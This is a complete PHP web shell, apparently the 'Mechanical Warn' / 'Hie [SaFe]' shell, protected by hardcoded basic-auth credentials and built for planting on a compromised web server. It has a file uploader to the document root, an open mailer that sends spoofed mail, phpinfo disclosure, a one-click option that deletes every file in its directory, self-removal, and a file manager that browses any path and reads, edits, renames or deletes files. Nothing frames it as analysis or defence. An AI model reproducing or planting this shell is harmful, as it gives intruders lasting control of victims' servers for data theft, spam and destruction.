<?php 
$user = "hieki";
$pass = "password";

session_start();
session_regenerate_id(true);

 if ((@$_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass)){
  header("WWW-Authenticate: Basic realm=\"Mechanical Warn\"");
  header("HTTP/1.0 401 Unauthorized");
  exit();
 } ?>
<style type="text/css">body{font-family: 'Inconsolata', monospace; background: black;}.cus{border:white;padding:8px 16px;overflow:hidden;text-decoration:none;background-color:blue;cursor:pointer;white-space:nowrap;}img{position: relative;z-index: 1;top: 0px;}a{color: white;}</style>
<link href="https://fonts.googleapis.com/css?family=Inconsolata&display=swap" rel="stylesheet">
 <!--Header-->
<link rel="icon" href="https://1.bp.blogspot.com/-Pg3WNU9jIRQ/Xh06NwB3Z-I/AAAAAAAAAYE/Im1GcEqVNSsTOEbs2vJ1njShsu2896JKgCLcBGAsYHQ/s1600/favicon.png" sizes="32x32" />
<title><?=$_SERVER['HTTP_HOST'] . " - Hie [SaFe]"; ?></title>
<font color="blue"><body><div align="center"><div style="color: white;">
+------------------------+[ Mechanical Warn ]+------------------------+
<br><br>
#[Uname]: <?php echo php_uname() . "
"; ?><br>
#[Server]: <?=$_SERVER['HTTP_HOST'] . "
"; ?><br>
#[dir]: <?php echo getcwd(); ?>\<?php $current_file_name = basename($_SERVER['PHP_SELF']);
echo $current_file_name . "
"; ?><br><br>+------------------------+[ Mh@nkk ]+------------------------+</div><br>
<img src="https://1.bp.blogspot.com/-ha3hqk1FS9w/XYRtZPyyofI/AAAAAAAAASo/ynpaUw_nNFERbwZGVWXXA4zFJm91gjGUQCLcBGAsYHQ/s320/Shinobu%2BKoucho2.png"style="width: 230px; left:0px;top:2px;position:absolute;" />
<img src="https://1.bp.blogspot.com/-7mkmbatW1RM/XYRtZLvuVeI/AAAAAAAAASs/ZlxAXKP5oWAvNxY-bxXaL1fTVJxxBGADACLcBGAsYHQ/s320/Shinobu%2BKoucho.png" style="width: 200px; left:1040px;top:16px;position:absolute;">
<!--End Header-->
<!--Menu-->
<font><center>
    <a href="?file_manager" class="cus">File Manager</a>
    <a href="?uploader" class="cus">Uploader</a>
    <a href="?mailer" class="cus">Mailer</a>
    <a href="?phpinfo" class="cus">PHP Info</a>
    <a href="?delete" class="cus" onclick="return  confirm('Hapus semua files?')">File Destroy</a>
    <a href="?die" class="cus" onclick="return  confirm('Mau Pergi?')">Self Remove</a>
</center></font><br><br><br><br>
<!--//End Menu-->
<?php 
if (isset($_GET['phpinfo'])) { ?>
    <body style="background: black;font-family: 'Inconsolata', monospace;">
    <?php echo phpinfo();}
?>
<!--//Uploader -->
<?php if(isset($_GET['uploader'])){
    echo "<br><br><font>Uploader</font><br><br><br><br><form method='post' enctype='multipart/form-data'><input type='file' name='idx_file'><input type='submit' name='upload' value='upload'></form>";} ?>
<?php
$root = $_SERVER['DOCUMENT_ROOT'];
$files = @$_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "sukses upload => <a href='$web/$files' target='_blank'><u>$web/$files</u></a>";} 
        else {echo "gagal upload di document root.";}}
                else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
            echo "sukses upload <b>$files</b> di folder ini";}
        else {echo "gagal upload";}}} ?>
<!--//End Uploader -->

<!--//Mailer-->
<?php if(isset($_GET['mailer'])){
echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><br><label  for="tujuan">For :</label><input  type="text" id="tujuan" name="tujuan" placeholder="kim@mail.com"/><br><label  for="subjek">Subject :</label><input  type="text" id="subjek" name="subjek"/><br><textarea name="pesan" id="pesan" rows="10" cols="30">Message</textarea><input type="hidden" name="send"><br><button id="Send">Send</button></form></center>';}?>
<?php if(@isset($_POST['send'])){
    ini_set( 'display_errors', 1 );   
    error_reporting( E_ALL );    
    $from    = 'mh@nkk';    
    $to      = $_POST['tujuan'];
    $subject = $_POST['subjek'];
    $message = $_POST['pesan'];   
    $headers = "From:" . $from;    
    mail($to,$subject,$message, $headers);    
    echo "Pesan email sudah terkirim ke ".$to."";}?>
<!--//End Mailer-->

<!--//File Destroy-->

<?php 
if (isset($_GET['delete'])) {
$files = scandir(__DIR__);
    foreach($files as $file){ // iterate files
        if(is_file($file))
        unlink($file);
    } 
    echo "All Files Deleted";
}?>
<!--//End File Destroy-->

<!--//Self Remove-->
<?php
if (isset($_GET['die'])) {
    unlink(__FILE__);
    echo "Sayonara :)";}
?>
<!--//End Self Remove-->

<!--//File Manager-->
<?php
    if (isset($_GET['file_manager'])) {
    	echo "<form action='?crt' method='get'><select name='wch'><option value='file'>Make File</option><option value='dir'>Make Dir</option></select><input type='text' name='nfile'><input type='submit' name='crt' value='Creat'></form>";
        echo '<table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td><font style="color:white;">Current Path : ';if(isset($_GET['path'])){$cwd=$_GET['path'];}else{$cwd = getcwd();} 
    $cwd = str_replace('\\','/',$cwd);$entah = explode('/',$cwd);
function permsa($bl){$mw = fileperms($bl);
    if (($mw & 0xC000) == 0xC000) {$hnk = 's';} 
    elseif (($mw & 0xA000) == 0xA000) {$hnk = 'l';} 
    elseif (($mw & 0x8000) == 0x8000) {$hnk = '-';} 
    elseif (($mw & 0x6000) == 0x6000) {$hnk = 'b';} 
    elseif (($mw & 0x4000) == 0x4000) {$hnk = 'd';} 
    elseif (($mw & 0x2000) == 0x2000) {$hnk = 'c';} 
    elseif (($mw & 0x1000) == 0x1000) {$hnk = 'p';} 
    else {$hnk = 'u';}$hnk .= (($mw & 0x0100) ? 'r' : '-');
        $hnk .= (($mw & 0x0080) ? 'w' : '-');
        $hnk .= (($mw & 0x0040) ?(($mw & 0x0800) ? 's' : 'x' ) :(($mw & 0x0800) ? 'S' : '-'));$hnk .= (($mw & 0x0020) ? 'r' : '-');$hnk .= (($mw & 0x0010) ? 'w' : '-');
        $hnk .= (($mw & 0x0008) ?(($mw & 0x0400) ? 's' : 'x' ) :(($mw & 0x0400) ? 'S' : '-'));$hnk .= (($mw & 0x0004) ? 'r' : '-');$hnk .= (($mw & 0x0002) ? 'w' : '-');
        $hnk .= (($mw & 0x0001) ?(($mw & 0x0200) ? 't' : 'x' ) :(($mw & 0x0200) ? 'T' : '-'));return $hnk;}
    foreach($entah as $yon=>$mhankk){ 
        if($mhankk == '' && $yon == 0){ $ngeod = true; 
    echo '<a href="?file_manager&path=/">/</a>'; continue; } 
    if($mhankk == '') continue; 
    echo '<a href="?file_manager&path='; 
    for($tod=0;$tod<=$yon;$tod++){ 
        echo "$entah[$tod]"; 
        if($tod != $yon) echo "/"; } echo '">'.$mhankk.'</a>/';}
        echo '</td></tr><tr><td>'; 
        if(isset($_GET['filesrc'])){ 
            echo "<tr><td>Current File : "; echo $_GET['filesrc']; echo '</tr></td></table><br />'; 
            echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}
            elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ 
            echo '</table><br /><center>'.$_POST['path'].'<br /><br />'; 

    if($_POST['opt'] == 'rename'){ 
        if(isset($_POST['newname'])){ 
            if(rename($_POST['path'],$cwd.'/'.$_POST['newname'])){ 
                echo '<font color="green">Change Name Done.</font><br />'; }
            else{ echo '<font color="red">Change Name Error.</font><br />'; } 
            $_POST['name'] = $_POST['newname']; } 
            echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="gox" /></form>';}

    elseif($_POST['opt'] == 'edit'){ 
        if(isset($_POST['src'])){ $kopet = fopen($_POST['path'],'w'); if(fwrite($kopet,$_POST['src'])){ 
            echo '<font color="green">Edit File Done.</font><br />'; }else{ echo '<font color="red">Edit File Error.</font><br />'; } 
            fclose($kopet); } 
            echo '<form method="POST"><textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="gox" /></form>'; } echo '</center>';}
    else{ echo '</table><br /><center>'; 
        if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ 
            if($_POST['type'] == 'dir'){ 
                if(rmdir($_POST['path'])){ 
                    echo '<font color="green">Delete Dir Done.</font><br />'; }
                else{ 
                    echo '<font color="red">Delete Dir Error.</font><br />'; } }
    elseif($_POST['type'] == 'file'){ 
            if(unlink($_POST['path'])){ 
                echo '<font color="green">Delete File Done.</font><br />'; }
            else{ echo '<font color="red">Delete File Error.</font><br />'; } } } echo '</center>'; $yonchan = scandir($cwd); 
                    echo '<div id="content"><table width="900" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"><td><center>Name</center></td><td><center>Size</center></td><td><center>Permissions</center></td><td><center>Options</center></td>
                            </tr>'; 
                foreach($yonchan as $kawai){ 
                    if(!is_dir("$cwd/$kawai") || $kawai == '.' || $kawai == '..') continue; 
                    echo "<tr><td><a href=\"?file_manager&path=$cwd/$kawai\">$kawai</a></td><td><center>--</center></td><td><center>"; 
                    if(is_writable("$cwd/$kawai")) 
                        echo '<font color="green">'; 
                elseif(!is_readable("$cwd/$kawai")) 
                        echo '<font color="red">'; 
                        echo permsa("$cwd/$kawai"); 
                    if(is_writable("$cwd/$kawai") || !is_readable("$cwd/$kawai")) echo '</font>'; 
                    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$kawai\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$kawai\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } 
                    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; 
            foreach($yonchan as $bl){ 
                if(!is_file("$cwd/$bl")) continue; 
                $lvu = filesize("$cwd/$bl")/1024; 
                $lvu = round($lvu,3); 
                if($lvu >= 1024){ $lvu = round($lvu/1024,2).' MB'; }else{ $lvu = $lvu.' KB'; } 
                echo "<tr><td><a href=\"?file_manager&filesrc=$cwd/$bl&path=$cwd\">$bl</a></td><td><center>".$lvu."</center></td><td><center>"; 
                if(is_writable("$cwd/$bl")) echo '<font color="green">';
            elseif(!is_readable("$cwd/$bl")) echo '<font color="red">'; 
                echo permsa("$cwd/$bl"); 
            if(is_writable("$cwd/$bl") || !is_readable("$cwd/$bl")) echo '</font>'; 
    echo "</center></td><td><center><form method=\"POST\" action=\"?file_manager&option&path=$cwd\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$bl\"><input type=\"hidden\" name=\"path\" value=\"$cwd/$bl\"><input type=\"submit\" value=\">\" /></form></center></td></tr>"; } echo '</table></div><br><br><br>';}}?>
</div>
